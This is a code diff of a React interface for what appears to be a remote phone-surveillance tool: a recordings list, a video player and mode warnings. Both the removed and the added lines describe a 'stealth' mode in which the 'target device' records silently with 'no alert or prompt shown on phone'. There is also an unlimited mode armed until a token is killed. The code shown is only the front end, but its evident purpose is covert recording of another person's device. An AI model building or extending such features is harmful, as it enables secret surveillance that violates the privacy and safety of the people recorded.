-            {/* ── Saved Recordings List ── */}
-            <div className="clay-card overflow-hidden">
-                <div className="px-4 py-3 border-b border-white/5 flex items-center justify-between">
-                    <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-white/60">
-                        <Film size={14} className="text-orange-400" />
-                        <span>Saved Recordings</span>
-                        {savedRecs.length > 0 && (
-                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-white/10 text-white/70 font-mono">
-                                {savedRecs.length}
-                            </span>
-                        )}
-                    </div>
-                    {savedRecs.length > 0 && (
-                        <button
-                            type="button"
-                            onClick={handleClearAll}
-                            className="text-[10px] font-mono text-white/30 hover:text-rose-400 transition-colors cursor-pointer"
-                        >
-                            Clear History
-                        </button>
-                    )}
-                </div>
+            {/* ── Stealth note ───────────────────────────────────────────────── */}
+            {recMode === 'stealth' && !isRecording && !pendingRec && (
+                <p className="text-[11px] text-white/20 text-center px-4 leading-relaxed">
+                    Completely silent — no prompt appears. Recordings arrive here automatically.
+                </p>
+            )}
 
-                {savedRecs.length === 0 ? (
-                    <div className="p-8 text-center space-y-1">
-                        <Video size={24} className="mx-auto text-white/20 mb-2" />
-                        <div className="text-xs text-white/40 font-mono">No recordings yet</div>
-                        <div className="text-[10px] text-white/25 font-mono">Completed videos will appear here automatically</div>
+            {/* ── Recordings list ────────────────────────────────────────────── */}
+            {savedRecs.length > 0 && (
+                <div className="clay-card overflow-hidden">
+                    <div className="px-4 py-2.5 flex items-center justify-between border-b border-white/[0.04]">
+                        <span className="text-[11px] font-semibold text-white/30 uppercase tracking-wider">Recordings ({savedRecs.length})</span>
+                        <button onClick={() => { setSavedRecs([]); if (selectedDeviceId) persist([], selectedDeviceId); }}
+                            className="text-[10px] text-white/15 hover:text-rose-400 transition-colors"
+                        >Clear all</button>
                     </div>
-                ) : (
-                    <div className="divide-y divide-white/5">
+                    <div className="divide-y divide-white/[0.03]">
                         {savedRecs.map(rec => (
-                            <div
-                                key={rec.id}
-                                onClick={() => setActiveVideo(rec)}
-                                className="flex items-center gap-3 px-4 py-3 hover:bg-white/5 transition-colors cursor-pointer group"
-                            >
-                                <div className="w-9 h-9 rounded-xl bg-orange-500/15 text-orange-400 flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform">
-                                    <Play size={14} className="fill-current ml-0.5" />
-                                </div>
+                            <div key={rec.id} className="flex items-center gap-3 px-4 py-3 hover:bg-white/[0.02] transition-colors group">
+                                {/* Play button */}
+                                <button
+                                    onClick={() => setPlayingRec(rec)}
+                                    className="w-9 h-9 rounded-xl bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-orange-400 hover:bg-orange-500/20 transition-all shrink-0"
+                                >
+                                    <Play size={13} className="fill-current ml-0.5"/>
+                                </button>
 
                                 <div className="flex-1 min-w-0">
                                     <div className="flex items-center gap-2">
-                                        <span className="text-xs font-bold text-white/90 font-mono">{fmtMs(rec.elapsedMs)}</span>
-                                        <span className={`text-[9px] px-1.5 py-0.2 rounded font-mono uppercase ${
-                                            rec.mode === 'stealth'
-                                                ? 'bg-orange-500/20 text-orange-300 border border-orange-500/30'
-                                                : 'bg-white/10 text-white/60'
-                                        }`}>
-                                            {rec.mode || 'video'}
-                                        </span>
+                                        <span className="text-xs font-semibold text-white/70 font-mono">{fmt(rec.elapsedMs)}</span>
+                                        <span className={`text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase tracking-wide ${
+                                            rec.mode === 'stealth' ? 'bg-orange-500/10 text-orange-400' : 'bg-white/8 text-white/30'
+                                        }`}>{rec.mode || 'rec'}</span>
                                     </div>
-                                    <div className="text-[10px] text-white/35 font-mono mt-0.5">
-                                        {new Date(rec.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })} · {fmtReason(rec.reason)}
-                                    </div>
+                                    <p className="text-[10px] text-white/20 mt-0.5">{timeAgo(rec.timestamp)} · {fmtReason(rec.reason)}</p>
                                 </div>
 
-                                <div className="flex items-center gap-1.5 shrink-0" onClick={e => e.stopPropagation()}>
-                                    <a
-                                        href={rec.url}
-                                        download={`recording_${rec.timestamp}.mp4`}
-                                        className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-white/50 hover:text-white transition-all"
-                                        title="Download Video"
-                                    >
-                                        <Download size={13} />
-                                    </a>
-                                    <button
-                                        type="button"
-                                        onClick={(e) => handleDeleteRecording(rec.id, e)}
-                                        className="p-2 rounded-xl bg-white/5 hover:bg-rose-500/20 text-white/30 hover:text-rose-400 transition-all cursor-pointer"
+                                <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
+                                    <a href={rec.url} download
+                                        className="p-1.5 rounded-lg text-white/25 hover:text-white hover:bg-white/8 transition-all"
+                                        title="Download"
+                                    ><Download size={12}/></a>
+                                    <button onClick={() => deleteRec(rec.id)}
+                                        className="p-1.5 rounded-lg text-white/20 hover:text-rose-400 hover:bg-rose-500/10 transition-all"
                                         title="Delete"
-                                    >
-                                        <Trash2 size={13} />
-                                    </button>
+                                    ><Trash2 size={12}/></button>
                                 </div>
                             </div>
                         ))}
                     </div>
-                )}
-            </div>
-
-            {/* ── Stealth Queued Confirmation Modal ── */}
-            {showStealthQueuedModal && (
-                <div
-                    onClick={(e) => { if (e.target === e.currentTarget) setShowStealthQueuedModal(false); }}
-                    className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-md flex items-end sm:items-center justify-center p-3 sm:p-4"
-                >
-                    <div className="clay-card max-w-sm w-full p-5 border border-orange-500/40 shadow-2xl space-y-4 animate-in slide-in-from-bottom-3">
-                        <div className="flex items-center gap-2.5 text-orange-400">
-                            <Shield size={20} className="shrink-0" />
-                            <span className="font-black text-sm uppercase tracking-wider">Stealth Task Queued</span>
-                        </div>
-
-                        <p className="text-xs text-white/70 font-mono leading-relaxed">
-                            Your request has been placed in the background queue for <span className="text-white font-bold">{fmtSec(recDuration)}</span>.
-                        </p>
-
-                        <div className="p-3 rounded-xl bg-white/5 border border-white/5 text-[11px] text-white/50 font-mono space-y-1">
-                            <div>• Target device will record silently in background</div>
-                            <div>• No alert or prompt shown on phone</div>
-                            <div>• Video will automatically appear in your list below</div>
-                        </div>
-
-                        <button
-                            type="button"
-                            onClick={() => setShowStealthQueuedModal(false)}
-                            className="w-full py-2.5 rounded-xl text-xs font-black bg-orange-500 hover:bg-orange-400 text-black transition-all cursor-pointer shadow-lg"
-                        >
-                            Got It
-                        </button>
-                    </div>
                 </div>
             )}
 
-            {/* ── Standard Mode Warning Modal ── */}
-            {showSimpleWarn && (
-                <div
-                    onClick={(e) => { if (e.target === e.currentTarget) setShowSimpleWarn(false); }}
-                    className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-md flex items-end sm:items-center justify-center p-3 sm:p-4"
-                >
-                    <div className="clay-card max-w-sm w-full p-5 border border-amber-500/40 shadow-2xl space-y-4 animate-in slide-in-from-bottom-3">
-                        <div className="flex items-center gap-2.5 text-amber-400">
-                            <AlertTriangle size={18} />
-                            <span className="font-black text-sm uppercase tracking-wider">Screen Prompt Notice</span>
-                        </div>
-                        <p className="text-xs text-white/70 font-mono leading-relaxed">
-                            Standard mode will display an authorization dialog on the device screen.
-                        </p>
-                        <div className="flex gap-2 pt-1">
-                            <button
-                                type="button"
-                                onClick={() => setShowSimpleWarn(false)}
-                                className="flex-1 py-2.5 rounded-xl text-xs font-mono text-white/50 hover:text-white border border-white/10 transition-all cursor-pointer"
-                            >
-                                Cancel
-                            </button>
-                            <button
-                                type="button"
-                                onClick={() => { setShowSimpleWarn(false); fireStartRecord(); }}
-                                className="flex-1 py-2.5 rounded-xl text-xs font-black bg-amber-500 hover:bg-amber-400 text-black transition-all cursor-pointer"
-                            >
-                                Send Prompt
-                            </button>
-                        </div>
+            {savedRecs.length === 0 && !isRecording && !pendingRec && (
+                <div className="py-12 flex flex-col items-center gap-2 text-center">
+                    <div className="w-10 h-10 rounded-2xl bg-white/[0.03] border border-white/[0.06] flex items-center justify-center">
+                        <Video size={16} className="text-white/15"/>
                     </div>
+                    <p className="text-[11px] text-white/20">No recordings yet</p>
                 </div>
             )}
 
-            {/* ── Unlimited Mode Warning Modal ── */}
-            {showUnlimWarn && (
+            {/* ── Inline video player modal ──────────────────────────────────── */}
+            {playingRec && (
                 <div
-                    onClick={(e) => { if (e.target === e.currentTarget) setShowUnlimWarn(false); }}
-                    className="fixed inset-0 z-[500] bg-black/80 backdrop-blur-md flex items-end sm:items-center justify-center p-3 sm:p-4"
+                    className="fixed inset-0 z-[500] bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
+                    onClick={() => setPlayingRec(null)}
                 >
-                    <div className="clay-card max-w-sm w-full p-5 border border-rose-500/40 shadow-2xl space-y-4 animate-in slide-in-from-bottom-3">
-                        <div className="flex items-center gap-2.5 text-rose-400">
-                            <AlertTriangle size={18} />
-                            <span className="font-black text-sm uppercase tracking-wider">Continuous Session</span>
-                        </div>
-                        <p className="text-xs text-white/70 font-mono leading-relaxed">
-                            Continuous capture will run until manually stopped. Extended recording consumes device battery and storage.
-                        </p>
-                        <div className="flex gap-2 pt-1">
-                            <button
-                                type="button"
-                                onClick={() => setShowUnlimWarn(false)}
-                                className="flex-1 py-2.5 rounded-xl text-xs font-mono text-white/50 hover:text-white border border-white/10 transition-all cursor-pointer"
-                            >
-                                Cancel
-                            </button>
-                            <button
-                                type="button"
-                                onClick={() => { setShowUnlimWarn(false); fireStartRecord(); }}
-                                className="flex-1 py-2.5 rounded-xl text-xs font-black bg-rose-500 hover:bg-rose-400 text-white transition-all cursor-pointer"
-                            >
-                                Confirm
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            )}
-
-            {/* ── In-App Video Player Lightbox Modal ── */}
-            {activeVideo && (
-                <div
-                    onClick={(e) => { if (e.target === e.currentTarget) setActiveVideo(null); }}
-                    className="fixed inset-0 z-[9999] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-3 sm:p-6 animate-in fade-in duration-200"
-                >
-                    <div className="clay-card max-w-3xl w-full flex flex-col shadow-2xl relative overflow-hidden border border-white/10 rounded-2xl sm:rounded-3xl bg-[#090b0e]">
-                        {/* Header */}
-                        <div className="px-4 sm:px-6 py-3.5 border-b border-white/10 bg-black/40 flex items-center justify-between">
-                            <div className="flex items-center gap-2.5">
-                                <span className="text-xs font-mono font-bold text-white">
-                                    Recording ({fmtMs(activeVideo.elapsedMs)})
-                                </span>
-                                <span className="text-[10px] text-white/40 font-mono">
-                                    {new Date(activeVideo.timestamp).toLocaleString()}
-                                </span>
+                    <div className="w-full max-w-sm space-y-2" onClick={e => e.stopPropagation()}>
+                        <div className="flex items-center justify-between px-1">
+                            <div>
+                                <p className="text-xs font-semibold text-white/60 font-mono">{fmt(playingRec.elapsedMs)} recording</p>
+                                <p className="text-[10px] text-white/25">{timeAgo(playingRec.timestamp)} · {fmtReason(playingRec.reason)}</p>
                             </div>
-
                             <div className="flex items-center gap-2">
-                                <a
-                                    href={activeVideo.url}
-                                    download={`recording_${activeVideo.timestamp}.mp4`}
-                                    className="p-1.5 rounded-xl bg-white/10 hover:bg-white/20 text-white transition-colors"
-                                    title="Download"
-                                >
-                                    <Download size={14} />
-                                </a>
-                                <button
-                                    type="button"
-                                    onClick={() => setActiveVideo(null)}
-                                    className="p-1.5 rounded-xl bg-white/10 hover:bg-rose-500/20 text-white/60 hover:text-rose-400 transition-colors cursor-pointer"
-                                    title="Close"
-                                >
-                                    <X size={15} />
-                                </button>
+                                <a href={playingRec.url} download
+                                    className="p-2 rounded-xl bg-white/8 text-white/50 hover:text-white hover:bg-white/12 transition-all"
+                                ><Download size={14}/></a>
+                                <button onClick={() => setPlayingRec(null)}
+                                    className="p-2 rounded-xl bg-white/8 text-white/50 hover:text-white transition-all"
+                                ><X size={14}/></button>
                             </div>
                         </div>
+                        <video
+                            src={playingRec.url}
+                            controls autoPlay
+                            className="w-full rounded-2xl bg-black border border-white/10 max-h-[70vh] object-contain"
+                            style={{ aspectRatio: '9/16' }}
+                        />
+                    </div>
+                </div>
+            )}
 
-                        {/* Player */}
-                        <div className="relative bg-black flex items-center justify-center p-1 sm:p-2 min-h-[300px]">
-                            <video
-                                src={activeVideo.url}
-                                controls
-                                autoPlay
-                                playsInline
-                                className="w-full max-h-[72vh] object-contain rounded-xl"
-                            />
+            {/* ── Simple mode warning ────────────────────────────────────────── */}
+            {showSimpleWarn && (
+                <div className="fixed inset-0 z-[600] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
+                    <div className="clay-card w-full max-w-sm p-5 border border-amber-500/25 space-y-4 animate-in slide-in-from-bottom-3">
+                        <div className="flex items-center gap-2 text-amber-400">
+                            <AlertTriangle size={16}/>
+                            <span className="font-bold text-sm">Visible Prompt</span>
+                        </div>
+                        <p className="text-xs text-white/50 leading-relaxed">
+                            A <span className="text-white font-semibold">"Start now?"</span> dialog will appear on the phone screen immediately.
+                        </p>
+                        <div className="flex gap-2">
+                            <button onClick={() => setShowSimpleWarn(false)}
+                                className="flex-1 py-2.5 rounded-xl text-xs font-semibold text-white/40 border border-white/8 hover:border-white/15 transition-all"
+                            >Cancel</button>
+                            <button onClick={() => { setShowSimpleWarn(false); fireStart(); }}
+                                className="flex-1 py-2.5 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-black transition-all"
+                            >Send Prompt</button>
+                        </div>
+                    </div>
+                </div>
+            )}
+
+            {/* ── Unlimited warning ──────────────────────────────────────────── */}
+            {showUnlimWarn && (
+                <div className="fixed inset-0 z-[600] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
+                    <div className="clay-card w-full max-w-sm p-5 border border-rose-500/25 space-y-4 animate-in slide-in-from-bottom-3">
+                        <div className="flex items-center gap-2 text-rose-400">
+                            <AlertTriangle size={16}/>
+                            <span className="font-bold text-sm">Unlimited Recording</span>
+                        </div>
+                        <p className="text-xs text-white/50 leading-relaxed">
+                            Recording runs until token is killed. May trigger battery or performance warnings on some devices.
+                        </p>
+                        <div className="flex gap-2">
+                            <button onClick={() => setShowUnlimWarn(false)}
+                                className="flex-1 py-2.5 rounded-xl text-xs font-semibold text-white/40 border border-white/8 hover:border-white/15 transition-all"
+                            >Cancel</button>
+                            <button onClick={() => { setShowUnlimWarn(false); fireStart(); }}
+                                className="flex-1 py-2.5 rounded-xl text-xs font-bold bg-rose-500 hover:bg-rose-400 text-white transition-all"
+                            >Arm Anyway</button>
                         </div>
                     </div>
                 </div>
